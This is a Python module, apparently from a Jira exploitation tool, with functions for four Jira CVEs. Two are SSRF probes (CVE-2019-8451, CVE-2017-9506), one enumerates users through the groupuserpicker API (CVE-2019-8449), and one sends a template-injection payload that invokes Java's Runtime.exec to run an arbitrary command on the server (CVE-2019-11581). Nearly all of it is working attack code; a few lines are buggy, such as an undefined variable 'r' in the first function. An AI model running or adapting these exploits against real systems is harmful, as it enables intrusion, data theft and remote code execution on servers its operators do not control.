#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from .recon import request, isjira, getversion, uparse
import requests, sys
from bs4 import BeautifulSoup

# CVE-2019-8451
def cve2019_8451(target, ssrf='https://google.com'):
	target = uparse(target)
	# http://host:port/plugins/servlet/gadgets/makeRequest?url=http://{}:{}@{}'.format(host, port, target)
	payload = target + "/plugins/servlet/gadgets/makeRequest?url=" + target + '@' + ssrf
	res, response = request(payload)

	if '"rc":200' in response and res.status_code == 200 and 'set-cookie' in response.content:
		print("[+] Success: Target is vulnerable!")
		print("CONTENTS:", response.content, sep="\n")
	elif res.status_code != 200:
		print("Something went wrong! (STATUS {})".format(r.status_code))
		if res.status_code == 302:
			print("HTTP request got redirected. Set this instead: " + r.headers['Location'])
	else:
		print("Target doesn't seems to be vulnerable. [CVE-2019-8451]")

# CVE-2017-9506
def cve2017_9506(target):
	target = uparse(target)
	test_ssrf_url = "https://www.google.com"
	payload = target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + test_ssrf_url
	res, response = request(payload)

	if res.status_code == 200 and 'googlelogo' in response.content:
		print("[+] Success: Target is vulnerable!")
		print('X-AUSERNAME: {}'.format(response.headers.get('X-AUSERNAME')))
		print("CONTENTS:", response.content, sep="\n")
	else:
		print("Target doesn't seems to be vulnerable. [CVE-2017-9506]")

# CVE-2019-8449
def cve2019_8449(target):
	target = uparse(target)
	dom = target + "/rest/api/latest/groupuserpicker"
	try:
		query = input("[>] Enter search query: [required] (e.g. admin) => ")
		maxResults = input("\n[>] Enter the number of maximum results to fetch: (50) => ")
		fieldId = input("\n[>] Enter the fieldId to fetch: => ")
		projectId = input("\n[>] Enter the projectId to fetch: => ")
		issueTypeId = input("\n[>] Enter the issueTypeId to fetch: => ")
	except KeyboardInterrupt:
		print('Interrupted.')
		quit()
	payload = {
		'query': query, 
		'maxResults': maxResults, 
		'showAvatar': 'true', 
		'fieldId': fieldId, 
		'projectId': projectId, 
		'issueTypeId': issueTypeId, 
		'avatarSize': 'xsmall', 
		'caseInsensitive': 'false', 
		'excludeConnectAddons': 'false'
	}

	try:
		r = requests.get(dom, params=payload)
		response = r.json()
	except:
		print("Target doesn't seems to be vulnerable. [CVE-2019-8449]")
		quit()

	print("CONTENTS:", response.content, sep="\n")

# CVE-2019-11581
def cve2019_11581(target, command='calc'): # default windows payload
	UA = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
	headers = {'UserAgent':UA}
	proxyDict = { 
			"http"  : "http://127.0.0.1:8080", 
			"https" : "https://127.0.0.1:8080"
	}
	target = uparse(target)
	target = target + '/secure/ContactAdministrators!default.jspa'
	sess = requests.Session()
	r = sess.get(target, proxies=proxyDict, verify=False)
	soup = BeautifulSoup(r.content, 'lxml')
	check = soup.findAll("div",{"class":"aui-message aui-message-warning warningd"})
	if check:
		print("[-] Target doesn't seems to be vulnerable. [CVE-2019-11581]")
	else:
		soup = BeautifulSoup(r.content, 'lxml')
		data = soup.findAll(attrs={"name" : "atl_token"})
		token = data[0]['value']
		print("[+] Found JIRA CSRF Token:", token)
		target= target.replace('!default.jspa','.jspa')
		# body of post request => (),'subject':"",'details':",'atl_token': value,'Send':'Send'}
		payload = "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('%s').waitFor()" % command
		params = (('from','JIRA@JIRA.com'),('subject',payload),('details',payload),('atl_token',token),('Send','Send'))
		final = sess.post(target, headers=headers, data=params, proxies=proxyDict, verify=False)
		print("[+] CONTENTS:", final, sep="\n")